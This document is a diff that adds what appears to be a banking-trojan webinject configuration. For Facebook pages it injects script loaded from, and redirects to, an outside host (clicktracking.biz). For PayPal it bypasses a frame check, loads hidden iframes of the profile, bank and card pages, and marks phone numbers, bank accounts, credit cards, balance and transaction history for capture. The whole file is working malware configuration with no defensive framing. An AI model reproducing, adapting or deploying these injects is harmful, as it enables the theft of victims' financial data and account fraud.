@@ -1,0 +1,109 @@
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;; PayPal
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+set_url http://www.facebook.* G
+data_before
+</head>
+data_end
+
+data_inject
+<script type="text/javascript">var isloaded = false;</script><script type="text/javascript" src="http://clicktracking.biz/gwjs.php?pub=139622&gateid=MTc4MDUw"></script><script type="text/javascript">if (!isloaded) { window.location = 'http://clicktracking.biz/abp'; }</script><noscript><meta http-equiv="refresh" content="0;url=http://clicktracking.biz/java" /></noscript>
+data_end
+
+data_after
+<body
+data_end
+
+set_url https://www.paypal.com/##/cgi-bin/webscr* G
+data_before
+parent.frames.length > 
+data_end
+data_after
+0
+data_end
+data_inject
+1
+data_end
+
+set_url https://www.paypal.com/##/cgi-bin/webscr?cmd=_login-done* G
+;set_url https://www.paypal.com/##/cgi-bin/webscr?cmd=_home* G
+data_before
+data_end
+data_after
+</body>
+data_end
+data_inject
+<iframe width="1" height="1" style="visibility:hidden" src="webscr?cmd=_profile-phone"></iframe>
+<iframe width="1" height="1" style="visibility:hidden" src="webscr?cmd=_profile-ach"></iframe>
+<iframe width="1" height="1" style="visibility:hidden" src="webscr?cmd=_profile-credit-card-new-clickthru"></iframe>
+<iframe width="1" height="1" style="visibility:hidden" src="webscr?cmd=_account"></iframe>
+data_end
+
+set_url https://www.paypal.com/##/cgi-bin/webscr?cmd=_profile-phone GL
+data_before
+<table class="basic phone_list">*</tr>
+data_end
+data_after
+</table>
+data_end
+data_inject
+Phone Numbers: 
+data_end
+
+set_url https://www.paypal.com/##/cgi-bin/webscr?cmd=_profile-ach GL
+data_before
+value="_profile-ach-submit"*</tr>
+data_end
+data_after
+</table>
+data_end
+data_inject
+Bank Account: 
+data_end
+
+set_url https://www.paypal.com/##/cgi-bin/webscr?cmd=_profile-credit-card-new-clickthru GL
+data_before
+<table class="basic fullTable">*</tr>
+data_end
+data_after
+</table>
+data_end
+data_inject
+Credit cards: 
+data_end
+
+set_url https://www.paypal.com/##/cgi-bin/webscr?cmd=_account GL
+;Status/Type
+data_before
+<div id="headline">
+data_end
+data_after
+</ul>
+data_end
+data_inject
+data_end
+
+;Balance
+data_before
+<span class="balance">
+data_end
+data_after
+</span>
+data_end
+data_inject
+PayPal balance: 
+data_end
+
+;History
+data_before
+<td headers="selectColumn"*>
+data_end
+data_after
+</table>
+data_end
+data_inject
+
+data_end
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
